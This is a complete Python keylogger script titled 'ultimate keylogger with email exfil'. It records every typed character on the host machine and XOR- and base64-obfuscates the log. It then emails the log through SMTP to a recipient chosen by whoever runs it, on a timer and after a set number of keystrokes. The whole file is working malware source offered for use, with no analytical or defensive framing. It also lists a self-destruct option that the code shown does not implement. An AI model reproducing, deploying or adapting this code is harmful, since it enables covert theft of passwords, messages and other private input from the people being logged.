# keylogger_ultimate.py
#!/usr/bin/env python3
import argparse
import base64
import datetime
import signal
import smtplib
import ssl
import sys
import threading
import time
import socket
from pynput.keyboard import Key, Listener

# Colors
R = "\033[0m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"

def c(t, code):
    return f"{code}{t}{R}"

XOR_KEY = "ultraprohacker"

def xor_bytes(data: bytes, key: str) -> bytes:
    kb = key.encode()
    kl = len(kb)
    return bytes(b ^ kb[i % kl] for i, b in enumerate(data))

def obfuscate(text: str) -> str:
    raw = text.encode("utf-8")
    enc = xor_bytes(raw, XOR_KEY)
    return base64.b64encode(enc).decode()

def send_email(smtp_host, smtp_port, sender, password, recipient, subject, body):
    obf_body = obfuscate(body)
    hostname = socket.gethostname()
    
    mime = f"""From: {sender}
To: {recipient}
Subject: {subject}
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

{obf_body}
"""
    
    try:
        ctx = ssl.create_default_context()
        if smtp_port == 465:
            with smtplib.SMTP_SSL(smtp_host, smtp_port, context=ctx, timeout=15) as srv:
                srv.login(sender, password)
                srv.sendmail(sender, recipient, mime.encode("utf-8"))
        else:
            with smtplib.SMTP(smtp_host, smtp_port, timeout=15) as srv:
                srv.ehlo()
                srv.starttls(context=ctx)
                srv.ehlo()
                srv.login(sender, password)
                srv.sendmail(sender, recipient, mime.encode("utf-8"))
        return True, "Sent"
    except Exception as e:
        return False, str(e)

class Keylogger:
    def __init__(self, args):
        self.args = args
        self.buffer = []
        self.lock = threading.Lock()
        self.keystrokes = 0
        self.running = True
        self.last_send = time.time()
        
        # Add session header
        header = f"=== KEYLOG SESSION ===\nTime: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nHost: {socket.gethostname()}\n{'-'*50}\n\n"
        self.buffer.append(header)
        
    def on_press(self, key):
        if not self.running:
            return False
        
        # SIMPLE KEY CAPTURE - Just use str() and handle special cases
        try:
            # Try to get the character directly
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
            elif key == Key.space:
                char = ' '
            elif key == Key.enter:
                char = '\n'
            elif key == Key.tab:
                char = '    '
            elif key == Key.backspace:
                char = ''  # Ignore backspace for simplicity
            else:
                char = ''  # Ignore other special keys
        except:
            char = ''
        
        # Only add if we got a character
        if char:
            with self.lock:
                self.buffer.append(char)
                self.keystrokes += 1
                
                # Show live feedback
                current_text = ''.join(self.buffer)[-60:]
                print(f"\r[{self.keystrokes}] {current_text}", end="", flush=True)
                
                # Check trigger
                if self.keystrokes % self.args.trigger == 0:
                    print()  # New line
                    self.send_buffer(f"Trigger: {self.keystrokes} keystrokes")
        
        # Check timer
        current_time = time.time()
        if current_time - self.last_send >= self.args.interval and self.keystrokes > 0:
            print()  # New line
            self.send_buffer(f"Timer: {self.args.interval} seconds")
    
    def send_buffer(self, reason):
        with self.lock:
            if len(self.buffer) <= 1:  # Only header, no keystrokes
                return
            payload = ''.join(self.buffer)
            # Keep header, clear keystrokes
            header = self.buffer[0]
            self.buffer = [header]
        
        if payload.strip():
            subject = f"[KL] {reason} - {datetime.datetime.now().strftime('%H:%M:%S')}"
            success, msg = send_email(
                self.args.smtp, self.args.port,
                self.args.email, self.args.password,
                self.args.to, subject, payload
            )
            
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            if success:
                print(c(f"\n  [{timestamp}] ✓ Email sent: {reason} ({self.keystrokes} total keys)", GREEN))
                self.last_send = time.time()
            else:
                print(c(f"\n  [{timestamp}] ✗ Failed: {msg}", RED))
    
    def stop(self):
        self.running = False
        print(c("\n\n  Stopping... Sending final log...", YELLOW))
        self.send_buffer("Final log")
        time.sleep(2)

def main():
    parser = argparse.ArgumentParser(description="Keylogger with Email Exfiltration")
    parser.add_argument("--email", required=True, help="Sender email")
    parser.add_argument("--password", required=True, help="Email password/app password")
    parser.add_argument("--to", required=True, help="Recipient email")
    parser.add_argument("--smtp", default="smtp.gmail.com", help="SMTP server")
    parser.add_argument("--port", type=int, default=587, help="SMTP port")
    parser.add_argument("--interval", type=int, default=30, help="Send every N seconds")
    parser.add_argument("--trigger", type=int, default=10, help="Send every N keystrokes")
    parser.add_argument("--self-destruct", action="store_true", help="Delete after first send")
    
    args = parser.parse_args()
    
    print(c("\n" + "="*60, CYAN))
    print(c("  ULTIMATE KEYLOGGER WITH EMAIL EXFIL", CYAN))
    print(c("="*60, CYAN))
    print(c(f"  Sending to: {args.to}", YELLOW))
    print(c(f"  Every: {args.interval}s OR {args.trigger} keys", YELLOW))
    print(c("  Press Ctrl+C to stop and send final log\n", RED))
    
    kl = Keylogger(args)
    
    # Handle Ctrl+C
    def signal_handler(sig, frame):
        kl.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start keylogger
    print(c("  ✓ LISTENING - Start typing now!\n", GREEN))
    with Listener(on_press=kl.on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()